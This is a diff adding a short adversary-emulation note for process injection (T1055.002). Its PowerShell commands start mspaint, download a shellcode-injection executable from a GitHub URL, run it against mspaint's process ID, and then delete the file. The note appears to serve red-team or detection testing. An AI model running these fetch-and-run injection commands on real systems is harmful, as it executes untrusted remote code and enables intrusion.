@@ -1,0 +1,13 @@
+Process Injection: Portable Executable Injection  8T1055.002
+
+POWERSHELL
+---------------------------------------------------
+mspaint
+Invoke-WebRequest -Uri https://github.com/PaulaMerino/TFM/raw/main/exec/shellcodeInjection.exe -OutFile "$env:USERPROFILE\Downloads\shellcodeInjection.exe"
+& "$env:USERPROFILE\Downloads\shellcodeInjection.exe" (Get-Process | ?{$_.ProcessName -eq "mspaint"} | Select-Object -ExpandProperty Id)
+
+
+CLEAN UP
+Remove-Item "$env:USERPROFILE\Downloads\shellcodeInjection.exe"
+---------------------------------------------------
+
